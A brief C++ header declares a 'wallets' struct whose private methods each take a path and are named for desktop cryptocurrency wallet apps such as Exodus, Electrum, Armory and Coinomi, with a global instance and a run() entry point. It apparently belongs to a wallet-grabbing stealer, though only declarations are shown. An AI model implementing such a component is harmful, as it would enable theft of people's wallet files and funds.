#pragma once

#include <windows.h>
#include <iostream>

struct wallets {
public:
	void run();
private:
	void exodus_app(std::string path);
	void bitcoin_core_app(std::string path);
	void armory_app(std::string path);
	void atomic_app(std::string path);
	void bytecoin_app(std::string path);
	void dash_core_app(std::string path);
	void electrum_app(std::string path);
	void litecoin_app(std::string path);
	void coinomi_app(std::string path);
};

extern wallets g_wallets;